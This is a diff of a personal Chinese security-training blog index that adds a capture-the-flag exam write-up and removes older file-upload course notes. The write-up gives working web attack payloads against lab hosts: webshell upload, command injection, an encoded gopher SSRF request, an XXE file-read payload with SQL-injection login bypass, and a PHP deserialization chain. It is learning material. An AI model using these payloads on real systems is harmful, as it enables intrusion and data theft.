@@ -69,6 +69,109 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-week9_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/10/week9_kls_exam/" class="article-date">
+  <time class="dt-published" datetime="2025-01-10T06:55:31.000Z" itemprop="datePublished">2025-01-10</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/exam/">exam</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/10/week9_kls_exam/">week9_kls_exam</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="题目1">题目1</span></h2><p>上传webshell</p>
+<p><img src="/../assets/image_1736487149418_0.png" alt="image.png"></p>
+<p>蚁剑连接，发现了小黑子</p>
+<p><img src="/../assets/image_1736487136674_0.png" alt="image.png"></p>
+<p>告诉俺flag不再这里，难不成你还有内网机器？</p>
+<p>看看&#x2F;etc&#x2F;hosts</p>
+<p><img src="/../assets/image_1736487249554_0.png" alt="image.png"></p>
+<p>开始爆破</p>
+<p><img src="/../assets/image_1736487402651_0.png" alt="image.png"></p>
+<p>emmm直接就是各命令执行，开整</p>
+<p><img src="/../assets/image_1736489279433_0.png" alt="image.png"></p>
+<p>payload</p>
+<p>命令执行</p>
+<p><code>cmd=id&amp;cat flag.php</code></p>
+<p>ssrf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=gopher%3A%2F%2F192.168.9.11%3A80%2F_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%39%25%32%65%25%33%31%25%33%31%25%33%61%25%33%38%25%33%30%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%31%25%30%64%25%30%61%25%34%33%25%36%31%25%36%33%25%36%38%25%36%35%25%32%64%25%34%33%25%36%66%25%36%65%25%37%34%25%37%32%25%36%66%25%36%63%25%33%61%25%32%30%25%36%64%25%36%31%25%37%38%25%32%64%25%36%31%25%36%37%25%36%35%25%33%64%25%33%30%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%37%61%25%36%38%25%32%64%25%34%33%25%34%65%25%32%63%25%37%61%25%36%38%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%30%64%25%30%61%25%34%66%25%37%32%25%36%39%25%36%37%25%36%39%25%36%65%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%38%25%32%65%25%33%31%25%33%34%25%33%30%25%32%65%25%33%32%25%33%32%25%33%39%25%32%65%25%33%31%25%33%32%25%33%61%25%33%31%25%33%30%25%33%30%25%33%30%25%33%30%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%35%35%25%37%30%25%36%37%25%37%32%25%36%31%25%36%34%25%36%35%25%32%64%25%34%39%25%36%65%25%37%33%25%36%35%25%36%33%25%37%35%25%37%32%25%36%35%25%32%64%25%35%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%37%33%25%33%61%25%32%30%25%33%31%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%31%25%33%30%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%32%39%25%32%30%25%34%31%25%37%30%25%37%30%25%36%63%25%36%35%25%35%37%25%36%35%25%36%32%25%34%62%25%36%39%25%37%34%25%32%66%25%33%35%25%33%33%25%33%37%25%32%65%25%33%33%25%33%36%25%32%30%25%32%38%25%34%62%25%34%38%25%35%34%25%34%64%25%34%63%25%32%63%25%32%30%25%36%63%25%36%39%25%36%62%25%36%35%25%32%30%25%34%37%25%36%35%25%36%33%25%36%62%25%36%66%25%32%39%25%32%30%25%34%33%25%36%38%25%37%32%25%36%66%25%36%64%25%36%35%25%32%66%25%33%31%25%33%33%25%33%31%25%32%65%25%33%30%25%32%65%25%33%36%25%33%37%25%33%37%25%33%38%25%32%65%25%33%38%25%33%36%25%32%30%25%35%33%25%36%31%25%36%36%25%36%31%25%37%32%25%36%39%25%32%66%25%33%35%25%33%33%25%33%37%25%32%65%25%33%33%25%33%36%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%38%25%37%34%25%36%64%25%36%63%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%36%25%36%39%25%36%36%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%37%37%25%36%35%25%36%32%25%37%30%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%30%25%36%65%25%36%37%25%32%63%25%32%61%25%32%66%25%32%61%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%33%25%36%39%25%36%37%25%36%65%25%36%35%25%36%34%25%32%64%25%36%35%25%37%38%25%36%33%25%36%38%25%36%31%25%36%65%25%36%37%25%36%35%25%33%62%25%37%36%25%33%64%25%36%32%25%33%33%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%37%25%30%64%25%30%61%25%35%32%25%36%35%25%36%36%25%36%35%25%37%32%25%36%35%25%37%32%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%38%25%32%65%25%33%31%25%33%34%25%33%30%25%32%65%25%33%32%25%33%32%25%33%39%25%32%65%25%33%31%25%33%32%25%33%61%25%33%31%25%33%30%25%33%30%25%33%30%25%33%30%25%32%66%25%37%36%25%37%35%25%36%63%25%36%65%25%35%66%25%36%39%25%36%62%25%37%35%25%36%65%25%32%65%25%37%30%25%36%38%25%37%30%25%33%66%25%37%35%25%37%32%25%36%63%25%33%64%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%39%25%32%65%25%33%31%25%33%31%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%39%25%36%65%25%36%37%25%33%61%25%32%30%25%36%34%25%36%35%25%36%36%25%36%63%25%36%31%25%37%34%25%36%35%25%32%63%25%32%30%25%36%32%25%37%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%62%25%36%35%25%36%35%25%37%30%25%32%64%25%36%31%25%36%63%25%36%39%25%37%36%25%36%35%25%30%64%25%30%61%25%30%64%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%39%25%36%34%25%32%35%25%33%32%25%33%36%25%36%33%25%36%31%25%37%34%25%32%62%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>
+
+<p><code>flag&#123;4104d0bdc968e8709b51f71cb3c755790e15e4df&#125;</code></p>
+<h2><span id="题目2">题目2</span></h2><p>密码123456登陆成功</p>
+<p>看起来好像有sql注入？？不管了，梭哈</p>
+<p><img src="/../assets/image_1736490053866_0.png" alt="image.png"></p>
+<p><img src="/../assets/image_1736490037642_0.png" alt="image.png"></p>
+<p>timu2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /get_students.php HTTP/1.1</span><br><span class="line">Host: 8.140.229.12:10001</span><br><span class="line">Content-Length: 30</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://8.140.229.12:10001</span><br><span class="line">Referer: http://8.140.229.12:10001/students.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: PHPSESSID=df31b1421a4fd4fff8f4b519d8afcd5f</span><br><span class="line">Connection: keep-alive</span><br><span class="line">&#123;&quot;id&quot;:&quot;&quot;,&quot;name&quot;:&quot;&quot;,&quot;grade&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>flag&#123;5e5326c0a2d2b4ce3e481f8bdd7f0da6&#125;</code></p>
+<h2><span id="题目3">题目3</span></h2><p>扫描路径</p>
+<p><img src="/../assets/image_1736491108763_0.png" alt="image.png"></p>
+<p>没啥东西啊，登陆一下看看。有万能密码，但是很奇怪，没有任何跳转。</p>
+<p>发现登陆接口是这个样子的，一眼xxe</p>
+<p><img src="/../assets/image_1736490505216_0.png" alt="image.png"></p>
+<p>回显位在uuid上。尝试包含<code>/etc/passwd</code>成功</p>
+<p>包含<code>flag.php</code>报错，但是扫到该文件了。尝试使用伪协议进base64编码</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;php://filter/convert.base64-encode/resource=/var/www/html/flag.php&#x27;&gt;]&gt;&lt;login&gt;&lt;user&gt;admin&#x27;or 1=1#&lt;/user&gt;&lt;pass&gt;123213&lt;/pass&gt;&lt;uuid&gt;&amp;test;&lt;/uuid&gt;&lt;/login&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1736491198198_0.png" alt="image.png"></p>
+<p><code>flag&#123;550c41a03d1646a97b7a68e6718e94ab&#125;</code></p>
+<h2><span id="题目4">题目4</span></h2><p>存在文件包含，尝试查看源码</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;首页&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">            background-color: <span class="comment">#f9f9f9;</span></span><br><span class="line">            color: <span class="comment">#333;</span></span><br><span class="line">        &#125;</span><br><span class="line">        header &#123;</span><br><span class="line">            background-color: <span class="comment">#0078D7;</span></span><br><span class="line">            color: white;</span><br><span class="line">            padding: <span class="number">20</span>px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">4</span>px <span class="number">8</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        nav &#123;</span><br><span class="line">            margin: <span class="number">20</span>px auto;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        nav a &#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            margin: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">            color: <span class="comment">#0078D7;</span></span><br><span class="line">            border: <span class="number">2</span>px solid <span class="comment">#0078D7;</span></span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">            transition: all <span class="number">0.3</span>s;</span><br><span class="line">        &#125;</span><br><span class="line">        nav a:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#0078D7;</span></span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">        footer &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            background-color: <span class="comment">#f1f1f1;</span></span><br><span class="line">            border-top: <span class="number">1</span>px solid <span class="comment">#ddd;</span></span><br><span class="line">            margin-top: <span class="number">20</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;header&gt;</span><br><span class="line">    &lt;h1&gt;欢迎来到首页&lt;/h1&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">&lt;nav&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.php&quot;</span>&gt;首页&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.php?file=test.php&quot;</span>&gt;猜猜这是什么 - Page <span class="number">1</span>&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.php?file=class.php&quot;</span>&gt;猜猜这是什么 - Page <span class="number">2</span>&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.php?file=flag.php&quot;</span>&gt;Flag&lt;/a&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;footer&gt;</span><br><span class="line">    &amp;copy; <span class="number">2025</span> cybersecurity</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;hacker~&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title class_">Test3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello chaitin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag在flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nb&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>一眼反序列化，尝试包含<code>/etc/passwd</code></p>
+<p><img src="/../assets/image_1736491514721_0.png" alt="image.png"></p>
+<p>index.php中的过滤好像并管不到nb这个参数，我们直接包含flag.php</p>
+<p>生产payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title class_">Test3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;data = <span class="string">&quot;/var/www/html/index.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=test.php&amp;nb=O:4:&quot;Main&quot;:1:&#123;s:8:&quot;ClassObj&quot;;O:5:&quot;Test3&quot;:1:&#123;s:4:&quot;data&quot;;s:22:&quot;/var/www/html/flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1736491667361_0.png" alt="image.png"></p>
+<p><code>flag&#123;92d5c6f8df9f7f5a711157446fbc1915&#125;</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/10/week9_kls_exam/" data-id="cm5qekx8a000019iwd656dn4h" data-title="week9_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-week8_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/03/week8_kls_exam/" class="article-date">
@@ -829,84 +932,6 @@
 
 
   
-    <article id="post-day29_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/20/day29_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-19T16:28:30.000Z" itemprop="datePublished">2024-12-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/20/day29_kls/">day29_kls</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="文件上传">文件上传</span></h3><p>原因</p>
-<p>后端未做严格校验，导致用户上传恶意文件</p>
-<p>危害</p>
-<p>控制站点</p>
-<p>资源耗尽</p>
-<p>挖掘</p>
-<p>传就完事啦</p>
-<p>利用</p>
-<p>上传webshell</p>
-<p>防御</p>
-<p>白名单</p>
-<p>使用oss存储</p>
-<p>存储与站点分离</p>
-<p>绕过防御</p>
-<p>php</p>
-<p>使用其他后缀</p>
-<p>.phtml</p>
-<p>.phar</p>
-<p>.php5</p>
-<p>.php7</p>
-<p>00截断</p>
-<p>利用条件</p>
-<p>配置文件关闭魔法引号</p>
-<p>php版本&lt;5.3</p>
-<p>上传路径可控</p>
-<p>原理</p>
-<p>php会将%00认为字符串的结尾</p>
-<p>双写</p>
-<p>图片马</p>
-<p>图片马生成</p>
-<p>图片马利用条件</p>
-<p>能够解析</p>
-<p>文件包含漏洞</p>
-<p>对抗压缩</p>
-<p>条件竞争</p>
-<p>php写文件</p>
-<p>apache</p>
-<p>修改配置文件，使其解析其他内容</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/20/day29_kls/" data-id="cm4w1kwbu0001kkiw0skkbgee" data-title="day29_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -922,7 +947,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/range/">range</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/xam/">xam</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/exam/">exam</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/range/">range</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/xam/">xam</a></li></ul>
     </div>
   </div>
 
@@ -964,6 +989,10 @@
       <ul>
         
           <li>
+            <a href="/2025/01/10/week9_kls_exam/">week9_kls_exam</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/03/week8_kls_exam/">week8_kls_exam</a>
           </li>
         
@@ -977,10 +1006,6 @@
         
           <li>
             <a href="/2024/12/26/day34_kls/">day34_kls</a>
-          </li>
-        
-          <li>
-            <a href="/2024/12/26/sqli-labs/">sqli-labs</a>
           </li>
         
       </ul>
